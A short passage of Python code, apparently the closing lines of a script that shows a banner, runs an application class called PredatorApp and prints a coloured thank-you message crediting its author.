    show_banner()
    app = PredatorApp()
    app.run()
    from rich import print as rprint
    rprint('[red]Thank you for using Predator – crafted by AgamSandhu-cysec[/red]')

